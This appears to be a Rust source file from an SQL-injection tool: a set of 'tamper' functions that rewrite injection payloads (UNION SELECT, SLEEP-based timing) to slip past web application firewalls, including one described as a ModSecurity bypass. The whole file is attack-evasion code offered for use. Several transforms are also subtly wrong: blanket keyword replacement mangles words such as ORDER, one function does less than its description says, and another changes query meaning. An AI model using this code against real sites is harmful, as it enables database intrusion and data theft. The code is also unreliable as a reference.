use super::TamperScript;

pub struct TamperMySqlVersionComment;
impl TamperScript for TamperMySqlVersionComment {
    fn name(&self) -> &'static str {
        "mysql_version_comment"
    }
    fn description(&self) -> &'static str {
        "Wrap keywords in /*!...*/ MySQL conditional comments"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "/*!SELECT*/")
            .replace("UNION", "/*!UNION*/")
            .replace("FROM", "/*!FROM*/")
            .replace("WHERE", "/*!WHERE*/")
            .replace("AND", "/*!AND*/")
            .replace("OR", "/*!OR*/")
    }
}

pub struct TamperMySql50000Comment;
impl TamperScript for TamperMySql50000Comment {
    fn name(&self) -> &'static str {
        "mysql50000comment"
    }
    fn description(&self) -> &'static str {
        "/*!50000SELECT*/ version-specific comment"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "/*!50000SELECT*/")
            .replace("UNION", "/*!50000UNION*/")
            .replace("FROM", "/*!50000FROM*/")
            .replace("WHERE", "/*!50000WHERE*/")
    }
}

pub struct TamperVersionComment;
impl TamperScript for TamperVersionComment {
    fn name(&self) -> &'static str {
        "version_comment"
    }
    fn description(&self) -> &'static str {
        "Wrap UNION SELECT in /*!12345...*/ version comment"
    }
    fn tamper(&self, payload: &str) -> String {
        if payload.to_uppercase().contains("UNION SELECT") {
            payload.replace("UNION SELECT", "/*!12345UNION SELECT*/")
        } else {
            payload.to_string()
        }
    }
}

pub struct TamperVersionedKeywords;
impl TamperScript for TamperVersionedKeywords {
    fn name(&self) -> &'static str {
        "versionedkeywords"
    }
    fn description(&self) -> &'static str {
        "Wrap all SQL keywords in /*!...*/ (generic MySQL versioned comment)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "/*!SELECT*/")
            .replace("UNION", "/*!UNION*/")
            .replace("WHERE", "/*!WHERE*/")
            .replace("FROM", "/*!FROM*/")
            .replace("AND", "/*!AND*/")
            .replace("OR", "/*!OR*/")
            .replace("INSERT", "/*!INSERT*/")
            .replace("UPDATE", "/*!UPDATE*/")
            .replace("DELETE", "/*!DELETE*/")
            .replace("ORDER", "/*!ORDER*/")
    }
}

pub struct TamperModSecurityZeroVersioned;
impl TamperScript for TamperModSecurityZeroVersioned {
    fn name(&self) -> &'static str {
        "modsecurityzeroversioned"
    }
    fn description(&self) -> &'static str {
        "Wrap all SQL keywords in /*!00000...*/ (ModSecurity bypass)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "/*!00000SELECT*/")
            .replace("UNION", "/*!00000UNION*/")
            .replace("WHERE", "/*!00000WHERE*/")
            .replace("FROM", "/*!00000FROM*/")
            .replace("AND", "/*!00000AND*/")
            .replace("OR", "/*!00000OR*/")
            .replace("INSERT", "/*!00000INSERT*/")
            .replace("UPDATE", "/*!00000UPDATE*/")
            .replace("DELETE", "/*!00000DELETE*/")
            .replace("ORDER", "/*!00000ORDER*/")
            .replace("GROUP", "/*!00000GROUP*/")
            .replace("HAVING", "/*!00000HAVING*/")
    }
}

pub struct TamperHalfVersionedMoreKeywords;
impl TamperScript for TamperHalfVersionedMoreKeywords {
    fn name(&self) -> &'static str {
        "halfversionedmorekeywords"
    }
    fn description(&self) -> &'static str {
        "Wrap keywords in /*!0...*/ half-versioned MySQL comment"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SELECT", "/*!0SELECT*/")
            .replace("UNION", "/*!0UNION*/")
            .replace("WHERE", "/*!0WHERE*/")
            .replace("FROM", "/*!0FROM*/")
            .replace("AND", "/*!0AND*/")
            .replace("OR", "/*!0OR*/")
            .replace("ORDER", "/*!0ORDER*/")
            .replace("INSERT", "/*!0INSERT*/")
            .replace("UPDATE", "/*!0UPDATE*/")
            .replace("DELETE", "/*!0DELETE*/")
    }
}

pub struct TamperUnionAllToUnion;
impl TamperScript for TamperUnionAllToUnion {
    fn name(&self) -> &'static str {
        "unionalltounion"
    }
    fn description(&self) -> &'static str {
        "UNION ALL SELECT -> UNION SELECT (signature simplification)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("UNION ALL SELECT", "UNION SELECT")
            .replace("union all select", "union select")
    }
}

pub struct TamperUnionSelectNospace;
impl TamperScript for TamperUnionSelectNospace {
    fn name(&self) -> &'static str {
        "union_select_nospace"
    }
    fn description(&self) -> &'static str {
        "UNION%0aSELECT (newline between UNION and SELECT)"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("UNION ALL SELECT", "UNION%0aALL%0aSELECT")
            .replace("UNION SELECT", "UNION%0aSELECT")
    }
}

pub struct TamperSleepToBenchmark;
impl TamperScript for TamperSleepToBenchmark {
    fn name(&self) -> &'static str {
        "sleep_to_benchmark"
    }
    fn description(&self) -> &'static str {
        "Replace SLEEP(n) with BENCHMARK() equivalent"
    }
    fn tamper(&self, payload: &str) -> String {
        let mut out = payload.to_string();
        while let Some(start) = out.to_uppercase().find("SLEEP(") {
            let rest = &out[start + 6..];
            if let Some(end) = rest.find(')') {
                let n_str = &rest[..end];
                if let Ok(n) = n_str.trim().parse::<u64>() {
                    let benchmark = format!("BENCHMARK({},MD5(1))", 5_000_000 * n);
                    out = format!("{}{}{}", &out[..start], benchmark, &rest[end + 1..]);
                } else {
                    break;
                }
            } else {
                break;
            }
        }
        out
    }
}

pub struct TamperSleep2GetLock;
impl TamperScript for TamperSleep2GetLock {
    fn name(&self) -> &'static str {
        "sleep2getlock"
    }
    fn description(&self) -> &'static str {
        "Replace SLEEP(n) with GET_LOCK('sqx',n) (SLEEP-blocking WAFs)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)SLEEP\((\d+)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("GET_LOCK('sqx',{})", &caps[1])
        })
        .to_string()
    }
}

pub struct TamperCommalessLimit;
impl TamperScript for TamperCommalessLimit {
    fn name(&self) -> &'static str {
        "commalesslimit"
    }
    fn description(&self) -> &'static str {
        "LIMIT 0,1 -> LIMIT 1 OFFSET 0 (MySQL comma-rule bypass)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re_upper = regex::Regex::new(r"LIMIT\s+(\d+)\s*,\s*(\d+)").unwrap();
        let re_lower = regex::Regex::new(r"limit\s+(\d+)\s*,\s*(\d+)").unwrap();
        let out = re_upper
            .replace_all(payload, |caps: &regex::Captures| {
                format!("LIMIT {} OFFSET {}", &caps[2], &caps[1])
            })
            .to_string();
        re_lower
            .replace_all(&out, |caps: &regex::Captures| {
                format!("limit {} offset {}", &caps[2], &caps[1])
            })
            .to_string()
    }
}

pub struct TamperCommalessMid;
impl TamperScript for TamperCommalessMid {
    fn name(&self) -> &'static str {
        "commalessmid"
    }
    fn description(&self) -> &'static str {
        "MID(a,b,c) -> MID(a FROM b FOR c)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)MID\(([^,]+),\s*(\d+)\s*,\s*(\d+)\s*\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("MID({} FROM {} FOR {})", &caps[1], &caps[2], &caps[3])
        })
        .to_string()
    }
}

pub struct TamperConcat2ConcatWs;
impl TamperScript for TamperConcat2ConcatWs {
    fn name(&self) -> &'static str {
        "concat2concatws"
    }
    fn description(&self) -> &'static str {
        "CONCAT(a,b) -> CONCAT_WS(MID(CHAR(0),0,0),a,b)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)CONCAT\((.+?),(.+?)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("CONCAT_WS(MID(CHAR(0),0,0),{},{})", &caps[1], &caps[2])
        })
        .to_string()
    }
}

pub struct TamperIfNull2IfIsNull;
impl TamperScript for TamperIfNull2IfIsNull {
    fn name(&self) -> &'static str {
        "ifnull2ifisnull"
    }
    fn description(&self) -> &'static str {
        "IFNULL(A,B) -> IF(ISNULL(A),B,A)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)IFNULL\(([^,]+),([^)]+)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("IF(ISNULL({}),{},{})", &caps[1], &caps[2], &caps[1])
        })
        .to_string()
    }
}

pub struct TamperIfNull2CaseWhenIsNull;
impl TamperScript for TamperIfNull2CaseWhenIsNull {
    fn name(&self) -> &'static str {
        "ifnull2casewhenisnull"
    }
    fn description(&self) -> &'static str {
        "IFNULL(a,b) -> CASE WHEN ISNULL(a) THEN b END (MySQL IFNULL bypass)"
    }
    fn tamper(&self, payload: &str) -> String {
        let re = regex::Regex::new(r"(?i)IFNULL\(([^,]+),([^)]+)\)").unwrap();
        re.replace_all(payload, |caps: &regex::Captures| {
            format!("CASE WHEN ISNULL({}) THEN {} END", &caps[1], &caps[2])
        })
        .to_string()
    }
}

pub struct TamperEquivalentFunctions;
impl TamperScript for TamperEquivalentFunctions {
    fn name(&self) -> &'static str {
        "equiv_functions"
    }
    fn description(&self) -> &'static str {
        "Swap SUBSTRING->MID, IF->IFNULL, CONCAT->CONCAT_WS"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("SUBSTRING(", "MID(")
            .replace("SUBSTR(", "MID(")
    }
}

pub struct TamperPlus2Concat;
impl TamperScript for TamperPlus2Concat {
    fn name(&self) -> &'static str {
        "plus2concat"
    }
    fn description(&self) -> &'static str {
        "Replace string + with CONCAT() for MySQL concat bypass"
    }
    fn tamper(&self, payload: &str) -> String {
        payload
            .replace("'+' ", "CONCAT(CHAR(43)) ")
            .replace(" + ", " CONCAT(CHAR(43)) ")
    }
}
